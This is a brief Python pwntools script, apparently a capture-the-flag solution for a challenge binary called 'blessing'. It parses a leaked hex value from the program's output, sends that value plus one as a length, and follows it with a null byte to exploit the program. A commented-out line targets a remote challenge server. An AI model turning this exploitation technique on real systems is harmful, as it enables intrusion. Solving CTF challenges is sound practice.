from pwn  import *

bin_name = "./blessing"

p = process(bin_name)

# p = gdb.debug(bin_name, """
#               b *(main+261)
#               b *(main+348)
#               b *(main+368)
#               c
#               """)

# p = remote("94.237.52.11", 52065)

data = p.recvuntil(b" length: ")
print(hexdump(data))
h_length = data[0x5db:0x5e7]
print("h_length")
song_length = int(h_length, base=16)
print("song length", hex(song_length))

print("Sending", str(song_length))
p.sendline(str(song_length+1))

p.recvuntil(b"Now tell me the song: ")

p.sendline(b"\x00")

print(p.recvall())

